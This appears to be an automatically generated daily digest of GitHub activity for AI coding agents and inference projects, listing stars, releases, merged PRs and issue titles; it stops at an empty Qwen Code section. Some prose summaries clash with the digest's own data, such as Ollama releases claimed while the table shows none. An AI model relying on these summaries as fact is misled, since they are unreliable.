# 📡 AI Ecosystem Digest — 2026-11-25

> Generated 2026-11-25 05:15 UTC by [yaojiejia/agents-radar](https://github.com/yaojiejia/agents-radar)

## 📊 24h Snapshot

| Repo | ⭐ Stars | New Issues | Closed | Merged PRs | Releases |
|------|---------|-----------|--------|-----------|----------|
| [Claude Code](https://github.com/anthropics/claude-code) | 156,971 | 25 | 0 | 0 | 1 |
| [OpenAI Codex](https://github.com/openai/codex) | 136,368 | 19 | 1 | 50 | 5 |
| [Gemini CLI](https://github.com/google-gemini/gemini-cli) | 109,085 | 0 | 0 | 2 | 0 |
| [GitHub Copilot CLI](https://github.com/github/copilot-cli) | 11,469 | 8 | 10 | 0 | 6 |
| [OpenCode](https://github.com/anomalyco/opencode) | 229,011 | 33 | 14 | 16 | 0 |
| [Qwen Code](https://github.com/QwenLM/qwen-code) | 30,928 | 35 | 6 | 6 | 0 |
| [OpenClaw](https://github.com/openclaw/openclaw) | 395,174 | 148 | 67 | 224 | 2 |
| [Hermes Agent](https://github.com/nousresearch/hermes-agent) | 265,945 | 21 | 11 | 1 | 2 |
| [vLLM](https://github.com/vllm-project/vllm) | 97,516 | 32 | 12 | 48 | 0 |
| [SGLang](https://github.com/sgl-project/sglang) | 39,033 | 20 | 16 | 14 | 0 |
| [llama.cpp](https://github.com/ggml-org/llama.cpp) | 136,177 | 16 | 25 | 43 | 10 |
| [Ollama](https://github.com/ollama/ollama) | 188,035 | 9 | 2 | 0 | 0 |
| [LiteLLM](https://github.com/BerriAI/litellm) | 63,850 | 19 | 45 | 148 | 5 |
| [Unsloth](https://github.com/unslothai/unsloth) | 80,200 | 13 | 5 | 140 | 1 |
| [AIBrix](https://github.com/vllm-project/aibrix) | 5,204 | 10 | 1 | 13 | 0 |
| [Semantic Router](https://github.com/vllm-project/semantic-router) | 6,525 | 15 | 8 | 1 | 0 |

---

## ✨ Highlights

- **Ollama** released v1.109.5 and v1.112.0-rc.1, along with multiple other releases, enhancing its functionality.  
- **GitHub Copilot CLI** had several releases up to v1.0.116-4, showcasing continuous improvements and updates.  
- **OpenAI Codex** merged several significant PRs, including [#63821](https://github.com/openai/codex/pull/63821) to enable fixed launch directories for shared MCP REPL servers.  
- **OpenCode** has a notably high-traffic new issue [#66067](https://github.com/anomalyco/opencode/issues/66067) about billing and backend routing, garnering 19 comments.  
- **AIBrix** reported a series of bugs with multiple issues, including a critical [RFC](https://github.com/vllm-project/aibrix/issues/3588) with 7 comments regarding global selectMu Redis I/O.

---

## 🖥️ AI CLI Tools

### Claude Code (`anthropics/claude-code`)

**Stars:** 156,971 · **Open issues:** 16,158 · **Last push:** <1h ago

On November 25, 2026, Claude Code released version 2.1.332, which introduced several key features, including skills from MCP servers that appear as `server:skill` in the menu, and a new `PreSkillShellCommand` hook event to manage inline shell commands. The update also added an "Always deliver" option for held messages from other sessions. In terms of new issues, a notable feature request was submitted to capture out-of-scope findings as follow-ups without prompting the user unnecessarily, while multiple bug reports were raised, including one about a 0-byte known_marketplaces.json file that remains unrepaired. Other significant bugs reported involve strict password prompts halting task completion and issues with audio playback in project sessions.

#### 🚀 New Releases
- [v2.1.332](https://github.com/anthropics/claude-code/releases/tag/v2.1.332) v2.1.332

#### 🐛 New Issues
- [#112120](https://github.com/anthropics/claude-code/issues/112120) [FEATURE] Capture out-of-scope findings as follow-ups, and stop at the goal instead of asking "should I also fix…?" `enhancement` `area:tui`
- [#112096](https://github.com/anthropics/claude-code/issues/112096) [BUG] A 0-byte known_marketplaces.json is never repaired and no session says so (2.1.331; #94451 was closed as inactive) `bug` `has repro` `platform:windows` `area:plugins` 💬1
- [#112098](https://github.com/anthropics/claude-code/issues/112098) [Bug] Claude Code stops tasks requiring password/credential entry, too strict permission prompts `bug` `platform:windows` `area:permissions` 💬1
- [#112119](https://github.com/anthropics/claude-code/issues/112119) I am trying to implement bit-mono for my .NET MAUI mobile... `bug` `platform:macos` `needs-info`
- [#112121](https://github.com/anthropics/claude-code/issues/112121) [BUG] claude.ai connector instructions are not re-sent after compaction, and are cut at 2,048 characters
- [#112116](https://github.com/anthropics/claude-code/issues/112116) [FEATURE] /code-review: check the diff against AGENTS.md rules, not only CLAUDE.md `enhancement` `platform:macos` `area:core`
- [#112118](https://github.com/anthropics/claude-code/issues/112118) Sidebar: show each session's state at a glance (color), and collapse finished project groups `enhancement` `area:tui`
- [#112117](https://github.com/anthropics/claude-code/issues/112117) You guys changed the model on us at first had the reset covering the week and t… `bug` `area:cost`
- [#112115](https://github.com/anthropics/claude-code/issues/112115) [FEATURE] Desktop Remote Control: opt-in to serve the home directory, keeping Claude's own folders protected `enhancement` `platform:macos` `area:desktop`
- [#112114](https://github.com/anthropics/claude-code/issues/112114) [BUG] Computer use: app_click on a Save panel's Export button returns "ok" but nothing is exported (macOS, background mode, Pages) `bug` `has repro` `platform:macos` `area:tools`
- [#112113](https://github.com/anthropics/claude-code/issues/112113) Project sessions and threads have lost the ability to playback audio `invalid`
- [#112112](https://github.com/anthropics/claude-code/issues/112112) Claude has significantly drifted, continuously: `bug` `platform:linux` `area:model`
- [#112111](https://github.com/anthropics/claude-code/issues/112111) [GitHub integration] `bug` `platform:web` `area:integrations` `github-integration`
- [#112110](https://github.com/anthropics/claude-code/issues/112110) Claude Code repeatedly ignores context it has, leaves work half-done without saying so, and pushes tasks back to a non-technical user `bug` `area:model` `area:claude-code-web`
- [#112109](https://github.com/anthropics/claude-code/issues/112109) [FEATURE] Expose per-model weekly limits (e.g. Fable) in statusLine rate_limits `enhancement` `platform:windows` `area:statusline`
- [#112108](https://github.com/anthropics/claude-code/issues/112108) [Desktop] Background command row stays "running" forever when the command exits within 1–2 seconds `bug` `platform:windows` `area:bash` `area:desktop`
- [#112107](https://github.com/anthropics/claude-code/issues/112107) [FEATURE] Desktop: reveal the sidebar when the pointer reaches the left edge `enhancement` `platform:macos` `area:desktop`
- [#112106](https://github.com/anthropics/claude-code/issues/112106) [FEATURE] iOS app: let links to files open in iOS (tap, or long press → Open), as other iOS apps do `enhancement` `platform:ios`
- [#112105](https://github.com/anthropics/claude-code/issues/112105) [GitHub integration] `bug` `github-integration`
- [#112104](https://github.com/anthropics/claude-code/issues/112104) [BUG] Desktop app: Files pane and file links keep resolving against the session's start folder after moving into a git worktree `bug` `has repro` `platform:macos` `area:desktop`
- [#112103](https://github.com/anthropics/claude-code/issues/112103) Desktop app: folder approval prompt repeats for every new session worktree despite trusted parent `bug` `platform:macos` `area:permissions` `area:desktop`
- [#112102](https://github.com/anthropics/claude-code/issues/112102) UNDP Design `question` `github-integration`
- [#112101](https://github.com/anthropics/claude-code/issues/112101) [FEATURE] desktop: ability to see Claude browser after opening a new window `enhancement` `area:desktop`
- [#112100](https://github.com/anthropics/claude-code/issues/112100) [BUG] Desktop app (Windows, Code tab): Japanese text renders with Chinese glyphs; needs lang="ja" (Windows follow-up to #76436) `bug` `platform:windows` `area:desktop`
- [#112099](https://github.com/anthropics/claude-code/issues/112099) feedback on new projects beta in claude code -- In threads, I as a develeoper w… `enhancement` `area:ui`

### OpenAI Codex (`openai/codex`)

**Stars:** 136,368 · **Open issues:** 28,575 · **Last push:** 1h ago

On November 25, 2026, several new releases of Rust were made, including versions 0.174.0-alpha.5, 0.174.0-alpha.4, 0.174.0-alpha.3, 0.174.0-alpha.2, and 0.173.0-alpha.5, reflecting ongoing development improvements. Significant merged pull requests included enhancements such as enabling fixed launch directories for shared MCP REPL servers (#63821) and updating packaged ripgrep to version 16.0.0 (#63811). Noteworthy user experience fixes involved preserving the saved Daybreak choice across live goal continuations (#63809) and hardening SSH host checks for plugin marketplaces (#63806). The day also saw the emergence of a critical new issue (#63577) related to account-specific capacity limits affecting users on the same network in ChatGPT Pro 200, raising concerns among users.

#### 🚀 New Releases
- [rust-v0.174.0-alpha.5](https://github.com/openai/codex/releases/tag/rust-v0.174.0-alpha.5) 0.174.0-alpha.5
- [rust-v0.174.0-alpha.4](https://github.com/openai/codex/releases/tag/rust-v0.174.0-alpha.4) 0.174.0-alpha.4
- [rust-v0.174.0-alpha.3](https://github.com/openai/codex/releases/tag/rust-v0.174.0-alpha.3) 0.174.0-alpha.3
- [rust-v0.174.0-alpha.2](https://github.com/openai/codex/releases/tag/rust-v0.174.0-alpha.2) 0.174.0-alpha.2
- [rust-v0.173.0-alpha.5](https://github.com/openai/codex/releases/tag/rust-v0.173.0-alpha.5) 0.173.0-alpha.5

#### ✅ Merged PRs
- [#63821](https://github.com/openai/codex/pull/63821) Enable fixed launch directories for shared MCP REPL servers
- [#63811](https://github.com/openai/codex/pull/63811) Update packaged ripgrep to 16.0.0
- [#63810](https://github.com/openai/codex/pull/63810) Use ChatGPT account preferences for Codex voice chat
- [#63809](https://github.com/openai/codex/pull/63809) Preserve the saved Daybreak choice across live goal continuations
- [#63808](https://github.com/openai/codex/pull/63808) Fix API workload identity authentication at startup and refresh
- [#63807](https://github.com/openai/codex/pull/63807) Discover model catalogs from HTTPS gateways
- [#63806](https://github.com/openai/codex/pull/63806) Harden SSH host checks for plugin marketplaces
- [#63802](https://github.com/openai/codex/pull/63802) Centralize terminal capability checks in the TUI
- [#63801](https://github.com/openai/codex/pull/63801) Centralize TUI image capability checks
- [#63797](https://github.com/openai/codex/pull/63797) Centralize TUI clipboard decisions in terminal capabilities
- [#63793](https://github.com/openai/codex/pull/63793) Centralize terminal compatibility policy in the TUI
- [#63790](https://github.com/openai/codex/pull/63790) Centralize TUI terminal capability decisions
- [#63789](https://github.com/openai/codex/pull/63789) Consolidate terminal capabilities in the TUI
- [#63788](https://github.com/openai/codex/pull/63788) Collapse turn details by default in the full-screen transcript
- [#63786](https://github.com/openai/codex/pull/63786) Show a resize cursor on the TUI workspace divider
- [#63785](https://github.com/openai/codex/pull/63785) Preserve multiline pastes without bracketed paste markers
- [#63784](https://github.com/openai/codex/pull/63784) Prevent accidental TUI interrupts after a steer is accepted
- [#63782](https://github.com/openai/codex/pull/63782) Recover when an MCP reply hits an expired HTTP session
- [#63781](https://github.com/openai/codex/pull/63781) Reuse configuration server OAuth discovery across startup reads
- [#63780](https://github.com/openai/codex/pull/63780) Add opt-in Statsig initialization to Codex core
- [#63775](https://github.com/openai/codex/pull/63775) Require port grants for Linux sandbox proxy bridges
- [#63774](https://github.com/openai/codex/pull/63774) Preserve Daybreak selection across automatic goal continuations
- [#63773](https://github.com/openai/codex/pull/63773) Make Bazel Rust tests portable across Linux environments
- [#63770](https://github.com/openai/codex/pull/63770) Include parent evidence in recorded Guardian reviews
- [#63769](https://github.com/openai/codex/pull/63769) Track additional context in conversation world state
- [#63767](https://github.com/openai/codex/pull/63767) Stabilize code-mode panic and process metrics tests
- [#63766](https://github.com/openai/codex/pull/63766) Support structured dynamic tool results in Code Mode
- [#63762](https://github.com/openai/codex/pull/63762) Add a process-wide runtime for Statsig evaluations
- [#63758](https://github.com/openai/codex/pull/63758) Search inline link labels in user messages
- [#63757](https://github.com/openai/codex/pull/63757) Add whitespace preservation to status line text
- [#63755](https://github.com/openai/codex/pull/63755) Support inline code in custom status lines
- [#63752](https://github.com/openai/codex/pull/63752) Add vertical layouts to custom status lines
- [#63748](https://github.com/openai/codex/pull/63748) Fix blank lines and backgrounds in nested TUI rows
- [#63743](https://github.com/openai/codex/pull/63743) Review saved exec escalations when read denials apply
- [#63742](https://github.com/openai/codex/pull/63742) Use root evidence in Guardian reviews for hosted agents
- [#63741](https://github.com/openai/codex/pull/63741) Add composer borders when the terminal background is unknown
- [#63740](https://github.com/openai/codex/pull/63740) Prefer terminal clipboard writes in VS Code dev containers
- [#63736](https://github.com/openai/codex/pull/63736) Restore the TUI Working indicator when a Stop hook continues a turn
- [#63735](https://github.com/openai/codex/pull/63735) Deduplicate model catalog strings in memory
- [#63730](https://github.com/openai/codex/pull/63730) Allow async user messages through code mode
- [#63729](https://github.com/openai/codex/pull/63729) Keep terminal pet animations in step with task status
- [#63727](https://github.com/openai/codex/pull/63727) Remove the image generation extension's dependency on `codex-core`
- [#63719](https://github.com/openai/codex/pull/63719) Trace fork history preparation and spawn-edge persistence
- [#63711](https://github.com/openai/codex/pull/63711) Bind sandbox CA access to the prepared managed proxy route
- [#63710](https://github.com/openai/codex/pull/63710) Detect Ghostty truecolor when SSH omits `COLORTERM`
- [#63708](https://github.com/openai/codex/pull/63708) Refresh the Codex CLI screenshot in the README
- [#63701](https://github.com/openai/codex/pull/63701) Show URL elicitation instructions in the TUI confirmation
- [#63695](https://github.com/openai/codex/pull/63695) Measure initial output collection time for `exec_command`
- [#63693](https://github.com/openai/codex/pull/63693) Preserve Guardian review evidence when callers are cancelled
- [#63692](https://github.com/openai/codex/pull/63692) Remove unused standalone connector listing helpers

#### 🐛 New Issues
- [#63577](https://github.com/openai/codex/issues/63577) Subject: Account-specific "Selected model is at capacity" on ChatGPT Pro 200 – other accounts on the same network unaffected `bug` `rate-limits` `app` `connectivity` 💬6
- [#63819](https://github.com/openai/codex/issues/63819) [CLI/TUI][macOS] Subagent entries and activity links no longer open details `bug` `TUI` `CLI` `subagent` 💬4
- [#63822](https://github.com/openai/codex/issues/63822) [TUI] FenceTracker closes a plain code fence on a quoted fence line `bug` `TUI` `CLI` 💬2
- [#63779](https://github.com/openai/codex/issues/63779) [Windows] Codex Desktop intermittently stalls during reasoning, with prolonged reconnects and "Selected model is at capacity" errors `bug` `windows-os` `app` `connectivity` 💬2
- [#63815](https://github.com/openai/codex/issues/63815) Autonomous Goal bypasses a user-defined delivery milestone and keeps spending context after handoff `bug` `model-behavior` `CLI` 💬2
- [#63747](https://github.com/openai/codex/issues/63747) Title generation attempts to use `:read-only` even if that has been disabled (in favor of custom permission profiles) `bug` `sandbox` `CLI` `session` 💬2
- [#63800](https://github.com/openai/codex/issues/63800) /voice ends when Bluetooth headphones connect or the default audio device changes (voice host exits with Device / 37) `bug` `TUI` `CLI` 💬2
- [#63827](https://github.com/openai/codex/issues/63827) Recurring Codex desktop automation failures and wasted usage credits `bug` `model-behavior` `windows-os` `app` 💬1
- [#63825](https://github.com/openai/codex/issues/63825) Repeated flags for cybersecurity `bug` `app` `safety-check` 💬1
- [#63823](https://github.com/openai/codex/issues/63823) 01a19dd8-002a-7a40-b9c5-c1f5dc4a87d0 `bug` `app` `safety-check` 💬1
- [#63700](https://github.com/openai/codex/issues/63700) [Linux][Pets] Floating Dot Quick Chat cannot take keyboard focus on GNOME/XWayland, with multi-monitor placement glitches `bug` `app` `pets` 💬1
- [#63813](https://github.com/openai/codex/issues/63813) macOS: saving a local project appears to add an extra ChatGPT directory level, leaving its original sidebar path unusable `bug` `app` `session` 💬1
- [#63817](https://github.com/openai/codex/issues/63817) Browser Use no longer works in the ChatGPT desktop app on Windows. `bug` `windows-os` `app` `browser` 💬1
- [#63829](https://github.com/openai/codex/issues/63829) [macOS] Chinese assistant prose can expose literal bold markers (26.1120.50957) `bug` `app`
- [#63828](https://github.com/openai/codex/issues/63828) Interactive (tty) exec_command silently runs in $HOME when the thread folder is deleted `bug` `CLI` `tool-calls` `app-server`
- [#63826](https://github.com/openai/codex/issues/63826) Linux sandbox: commands run with a pty lose their controlling terminal `bug` `sandbox` `CLI` `app-server`
- [#63824](https://github.com/openai/codex/issues/63824) Missong ~/.codex directory when installed as VS Code extension on remote machine using Remote-SSH `bug` `extension` `auth` `remote`
- [#63820](https://github.com/openai/codex/issues/63820) apply_patch repeatedly allocates strings when matching typographic punctuation `bug` `CLI` `performance`
- [#63818](https://github.com/openai/codex/issues/63818) [macOS] Last turn diff is blank after a successful edit while Unstaged shows +1 −1 `bug` `code-review` `app`

#### 🔒 Closed Issues
- [#55432](https://github.com/openai/codex/issues/55432) Selected model is at capacity. Please try a different model

### Gemini CLI (`google-gemini/gemini-cli`)

**Stars:** 109,085 · **Open issues:** 751 · **Last push:** 4h ago

On November 25, 2026, Gemini CLI saw no new releases. However, two important pull requests were merged: one focused on normalizing hook command names with leading environment variable assignments (PR #30448), and the other addressed a compatibility issue by quoting the IDE CLI command path on Windows for cmd.exe (PR #30390). There were no new issues reported during this timeframe, indicating a stable development environment. Overall, the day consisted of routine maintenance with significant improvements aimed at enhancing user experience across different operating systems.

#### ✅ Merged PRs
- [#30448](https://github.com/google-gemini/gemini-cli/pull/30448) fix(core): normalize hook command names with leading environment variable assignments
- [#30390](https://github.com/google-gemini/gemini-cli/pull/30390) fix(core): quote IDE CLI command path on Windows for cmd.exe

### GitHub Copilot CLI (`github/copilot-cli`)

**Stars:** 11,469 · **Open issues:** 2,169 · **Last push:** <1h ago

On November 25, 2026, GitHub Copilot CLI saw several updates with the release of versions v1.0.116-4, v1.0.116-3, v1.0.116-2, v1.0.116-1, and v1.0.116-0, enhancing features such as build-time JSON Schema for extension manifests and improvements to handling PowerShell parameters. Notably, v1.0.116-4 fixed issues with folder trust prompts and enhanced sandbox permissions for Swift tools, while v1.0.116-3 added the ability to jump to the latest output in the timeline and set environment variables for all Copilot processes. A significant new issue reported today includes #5565, which details that the create_session command hangs indefinitely when a child session host fails to register, potentially complicating user interactions.

#### 🚀 New Releases
- [v1.0.116-4](https://github.com/github/copilot-cli/releases/tag/v1.0.116-4) 1.0.116-4
- [v1.0.116-3](https://github.com/github/copilot-cli/releases/tag/v1.0.116-3) 1.0.116-3
- [v1.0.116-2](https://github.com/github/copilot-cli/releases/tag/v1.0.116-2) 1.0.116-2
- [v1.0.116-1](https://github.com/github/copilot-cli/releases/tag/v1.0.116-1) 1.0.116-1
- [v1.0.116-0](https://github.com/github/copilot-cli/releases/tag/v1.0.116-0) 1.0.116-0
- [v1.0.115](https://github.com/github/copilot-cli/releases/tag/v1.0.115) 1.0.115

#### 🐛 New Issues
- [#5569](https://github.com/github/copilot-cli/issues/5569) ACP: Copilot emits a final answer twice when an attached shell is still running `triage`
- [#5570](https://github.com/github/copilot-cli/issues/5570) Copilot App: subsession started from a side chat reports to the main chat instead of the side chat `triage`
- [#5568](https://github.com/github/copilot-cli/issues/5568) MCP registry requests omit User-Agent and fail AWS WAF validation; reproduced in CLI 1.0.115 `triage`
- [#5567](https://github.com/github/copilot-cli/issues/5567) argument-hint doesn't show for skills `triage`
- [#5566](https://github.com/github/copilot-cli/issues/5566) CO PILOT QUICK `triage`
- [#5565](https://github.com/github/copilot-cli/issues/5565) create_session hangs indefinitely when child session host fails to register (no timeout); non-ASCII name mojibake `triage`
- [#5564](https://github.com/github/copilot-cli/issues/5564) Files denied in a CoPilot sandbox are read and copied by the CLI into COPILOT_HOME `triage`
- [#5563](https://github.com/github/copilot-cli/issues/5563) CoPilot in Terminal truncates text relentlessly `triage`

#### 🔒 Closed Issues
- [#4275](https://github.com/github/copilot-cli/issues/4275) ACP: expose contextTier as a session config option (parity with interactive /model picker)
- [#5171](https://github.com/github/copilot-cli/issues/5171) NumLock-off numpad navigation and Delete are ignored
- [#4191](https://github.com/github/copilot-cli/issues/4191) Clipboard access doesn't work in vscode -> terminal (WSL) -> screen/tmux
- [#3253](https://github.com/github/copilot-cli/issues/3253) Permanently allowed URLs (and other permissions) are not persisted across sessions
- [#1573](https://github.com/github/copilot-cli/issues/1573) Editing in the CLI
- [#5059](https://github.com/github/copilot-cli/issues/5059) Expose agentId in subagentStart hook for secure parent-child policy correlation
- [#4863](https://github.com/github/copilot-cli/issues/4863) SIGINT exits prompt process but model work continues and OTel later reports success
- [#4513](https://github.com/github/copilot-cli/issues/4513) Plugin marketplace cache ignores ref when shared across projects with different branches
- [#5532](https://github.com/github/copilot-cli/issues/5532) showReasoning setting doesn't work for Gemini models
- [#5560](https://github.com/github/copilot-cli/issues/5560) Copilot CLI rg compaction corrupts filenames with multiple numeric suffixes

### OpenCode (`anomalyco/opencode`)

**Stars:** 229,011 · **Open issues:** 4,131 · **Last push:** <1h ago

On November 25, 2026, there were no new releases for OpenCode. Significant progress was made with several important merged pull requests, including the addition of push notifications for mobile apps (#66130) and improvements in performance and functionality like tracing background compaction (#66254) and optimizing file change diffs (#66246). Notably, a fix was implemented to prevent Code Mode from unnecessarily reading every byte of a Uint8Array (#66242). Among the new issues logged, one particularly stands out: a bug concerning conversation routing across multiple backends, which results in unwarranted re-billing (#66067).

#### ✅ Merged PRs
- [#66215](https://github.com/anomalyco/opencode/pull/66215) fix(core): move subagents with their parent session
- [#66254](https://github.com/anomalyco/opencode/pull/66254) feat(core): trace background compaction and the wait for it
- [#66130](https://github.com/anomalyco/opencode/pull/66130) feat(core): add push notifications for the mobile apps
- [#66251](https://github.com/anomalyco/opencode/pull/66251) perf(codemode): skip redundant schema work in Code Mode catalogs
- [#66246](https://github.com/anomalyco/opencode/pull/66246) perf(core): diff file changes once and skip diffing empty sides
- [#66253](https://github.com/anomalyco/opencode/pull/66253) fix(release): pin the data OG Worker's renamed OpenMono font modules
- [#66257](https://github.com/anomalyco/opencode/pull/66257) fix(app): send prod crashes to Sentry only when Report is clicked
- [#66248](https://github.com/anomalyco/opencode/pull/66248) docs(plugin): describe the new quote text in ComposerQuote
- [#66247](https://github.com/anomalyco/opencode/pull/66247) fix(app): send quotes as plain reply-style blockquotes
- [#66244](https://github.com/anomalyco/opencode/pull/66244) fix(core): say which MCP server a skill comes from
- [#65994](https://github.com/anomalyco/opencode/pull/65994) feat(data): share and embed cards for every section, behind the share flag
- [#66242](https://github.com/anomalyco/opencode/pull/66242) fix(core): stop Code Mode Bun.write from walking every byte of a Uint8Array
- [#66210](https://github.com/anomalyco/opencode/pull/66210) fix(core): tell same-named MCP skills apart instead of dropping one
- [#66224](https://github.com/anomalyco/opencode/pull/66224) fix(legacy): return 404 when the GitHub App is not installed
- [#66014](https://github.com/anomalyco/opencode/pull/66014) fix(app): keep the New timeline's rows still when older history loads
- [#66225](https://github.com/anomalyco/opencode/pull/66225) fix(data): stop sharing in-flight catalog and stats reads across requests

#### 🐛 New Issues
- [#66067](https://github.com/anomalyco/opencode/issues/66067) Go: one conversation with a stable x-opencode-session is routed across multiple deepseek-v4.1-flash backends, and each switch re-bills the full prefix `type/bug` `area/providers` `inference/go` 💬19
- [#66166](https://github.com/anomalyco/opencode/issues/66166) server: custom providers from global config not registered on service boot `type/bug` `area/service` `version/v2` `platform/linux` 💬6
- [#66146](https://github.com/anomalyco/opencode/issues/66146) skills: deleting a git worktree wipes project skills from the shared registry `type/bug` `area/plugins` `version/v2` `platform/macos` 💬4
- [#66087](https://github.com/anomalyco/opencode/issues/66087) desktop: cost display is hardcoded to USD — make display currency configurable (CNY) `type/feature` `area/desktop` `version/v2` `platform/windows` 💬3
- [#66053](https://github.com/anomalyco/opencode/issues/66053) shell: redirected directory commands (cd . > file, Set-Location . > file) skip all shell permission checks `type/bug` `status/repro-simulated` `area/core` `version/v2` 💬3
- [#66185](https://github.com/anomalyco/opencode/issues/66185) claude-agent: bound idle claude processes and stop finished subagents early `type/feature` `area/providers` `version/v2` 💬1
- [#66192](https://github.com/anomalyco/opencode/issues/66192) scripts: path comparisons break on Windows (check-greys fails the pre-push hook, upgrade-opentui skips nothing) `type/bug` `status/repro-plausible` `version/v2` `platform/windows` 💬2
- [#66203](https://github.com/anomalyco/opencode/issues/66203) tui: Model variant becomes sticky after selecting any variant like #high, you can't change it afterwards. `triaging` `type/bug` `area/tui` `version/v2` 💬2
- [#66132](https://github.com/anomalyco/opencode/issues/66132) remote: phone pairing loses HTTPS URL when shared service drops (Windows 2.4.1) `triaging` `type/bug` `area/service` `version/v2` 💬2
- [#66172](https://github.com/anomalyco/opencode/issues/66172) Desktop browser pane (Linux/Wayland): agent-driven tab stays compositor-frozen while backgrounded — rAF dead despite visibilityState "visible"; #63002's wake-before-command not effective `type/bug` `area/desktop` `version/v2` `platform/linux` 💬2
- [#66124](https://github.com/anomalyco/opencode/issues/66124) after update the model selection is reset and projects are not visible anymore `triaging` `type/bug` `area/sessions-storage` `version/v1` 💬2
- [#66121](https://github.com/anomalyco/opencode/issues/66121) cli: opencode-pty sidecar spins on one thread and every shell call times out `type/bug` `area/service` `version/v2` `platform/linux` 💬2
- [#66262](https://github.com/anomalyco/opencode/issues/66262) core: exact edit misses after formatter changes file spacing `type/feature` `area/core` `version/v2` `platform/macos` 💬1
- [#66260](https://github.com/anomalyco/opencode/issues/66260) Web: pasting a screenshot fails on Safari ("请求失败 null") — clipboard TIFF/HEIC rejected by image whitelist `type/bug` `area/web` `version/v2` `platform/macos` 💬1
- [#66259](https://github.com/anomalyco/opencode/issues/66259) v2: Gemini 400 model-turn on tool continuation — trailing signature-only model content after functionResponse (stored-part evidence, follow-up to #64628 / #55514) `type/bug` `area/providers` `version/v2` `platform/windows` 💬1
- [#66258](https://github.com/anomalyco/opencode/issues/66258) rate-limit: no config for retry backoff or attempt cap; auto-retry resubmits the full session `type/feature` `area/core` `version/v2` `platform/linux` 💬1
- [#66256](https://github.com/anomalyco/opencode/issues/66256) desktop: terminal ignores cursor shape escapes (DECSCUSR) `type/bug` `status/repro-simulated` `area/desktop` `version/v2` 💬1
- [#66255](https://github.com/anomalyco/opencode/issues/66255) gui-plugins: Electron crash fixture expects the wrong reason on macOS ARM64 `type/bug` `area/desktop` `version/v2` `platform/macos` 💬1
- [#66252](https://github.com/anomalyco/opencode/issues/66252) tui: plugin sidebar slot never repaints on plugin state changes `type/bug` `area/plugins` `version/v2` `platform/linux` 💬1
- [#66249](https://github.com/anomalyco/opencode/issues/66249) ollama: no effective output cap — agent turns send max_completion_tokens (ignored by Ollama), title request sends none `type/bug` `status/repro-simulated` `area/providers` `version/v2` 💬1
- [#66243](https://github.com/anomalyco/opencode/issues/66243) 无法添加项目名称相同，路径不同的2个项目 `triaging` `type/bug` `version/v2` `platform/windows` 💬1
- [#66241](https://github.com/anomalyco/opencode/issues/66241) Deny execute action in agent md file cause error `type/bug` `status/repro-simulated` `area/core` `version/v2` 💬1
- [#66239](https://github.com/anomalyco/opencode/issues/66239) desktop: "ask" permissions never prompt, only deny is enforced `type/bug` `area/core` `version/v2` `platform/windows` 💬1
- [#66236](https://github.com/anomalyco/opencode/issues/66236) [FEATURE]: Why not built-in LLM proxy gateway? `type/feature` `area/sdk-api` 💬1
- [#66234](https://github.com/anomalyco/opencode/issues/66234) Different context usage between desktop and shell `type/bug` `status/repro-simulated` `area/desktop` `version/v2` 💬1
- [#66235](https://github.com/anomalyco/opencode/issues/66235) [FEATURE]: Allow configurable subagent preamble prompt since some agents have a strict prompt format `type/feature` `area/core` `version/v2` 💬1
- [#66213](https://github.com/anomalyco/opencode/issues/66213) fix(core): subagent contract requires sessionID and blocks new child sessions `type/bug` `area/core` `version/v2` `platform/linux` 💬1
- [#66200](https://github.com/anomalyco/opencode/issues/66200) [FEATURE]: Desktop: let GUI plugin panels stay visible alongside the browser and other side tabs `type/feature` `area/desktop` `version/v2` `platform/windows` 💬1
- [#66199](https://github.com/anomalyco/opencode/issues/66199) server: long-running daemon stops activating configured providers after config hot-reload; restart fixes `type/bug` `area/plugins` `version/v2` `platform/linux` 💬1
- [#66196](https://github.com/anomalyco/opencode/issues/66196) desktop: add Ctrl+H shortcut to search recently closed tabs `type/feature` `area/desktop` `version/v2` `platform/windows` 💬1
- [#66191](https://github.com/anomalyco/opencode/issues/66191) cli: sessions created by legacy CLI (1.18.x) don't appear in desktop app's session list (version skew, no warning) `type/bug` `area/sessions-storage` `version/v2` `platform/linux` 💬1
- [#66190](https://github.com/anomalyco/opencode/issues/66190) [FEATURE]: Desktop session row menu should offer the usual session actions `type/feature` `area/desktop` `version/v2` `platform/windows` 💬1
- [#66184](https://github.com/anomalyco/opencode/issues/66184) v2.0.21: step hangs after a parallel tool batch, step.streamed never comes and the WebSocket timeout never fires `type/bug` `area/providers` `version/v2` 💬1

#### 🔒 Closed Issues
- [#66166](https://github.com/anomalyco/opencode/issues/66166) server: custom providers from global config not registered on service boot
- [#66146](https://github.com/anomalyco/opencode/issues/66146) skills: deleting a git worktree wipes project skills from the shared registry
- [#57512](https://github.com/anomalyco/opencode/issues/57512) [FEATURE]: announce the active turn status to screen readers in the web UI
- [#54652](https://github.com/anomalyco/opencode/issues/54652) bug(session-ui): V2 still hides streaming assistant content from screen readers
- [#66203](https://github.com/anomalyco/opencode/issues/66203) tui: Model variant becomes sticky after selecting any variant like #high, you can't change it afterwards.
- [#66132](https://github.com/anomalyco/opencode/issues/66132) remote: phone pairing loses HTTPS URL when shared service drops (Windows 2.4.1)
- [#66124](https://github.com/anomalyco/opencode/issues/66124) after update the model selection is reset and projects are not visible anymore
- [#66121](https://github.com/anomalyco/opencode/issues/66121) cli: opencode-pty sidecar spins on one thread and every shell call times out
- [#66259](https://github.com/anomalyco/opencode/issues/66259) v2: Gemini 400 model-turn on tool continuation — trailing signature-only model content after functionResponse (stored-part evidence, follow-up to #64628 / #55514)
- [#66252](https://github.com/anomalyco/opencode/issues/66252) tui: plugin sidebar slot never repaints on plugin state changes
- [#66239](https://github.com/anomalyco/opencode/issues/66239) desktop: "ask" permissions never prompt, only deny is enforced
- [#66213](https://github.com/anomalyco/opencode/issues/66213) fix(core): subagent contract requires sessionID and blocks new child sessions
- [#66199](https://github.com/anomalyco/opencode/issues/66199) server: long-running daemon stops activating configured providers after config hot-reload; restart fixes
- [#66191](https://github.com/anomalyco/opencode/issues/66191) cli: sessions created by legacy CLI (1.18.x) don't appear in desktop app's session list (version skew, no warning)

### Qwen Code (`QwenLM/qwen-code`)

**Stars:** 30,928 · **Open issues:** 2,594 · **Last push:** <1h ago

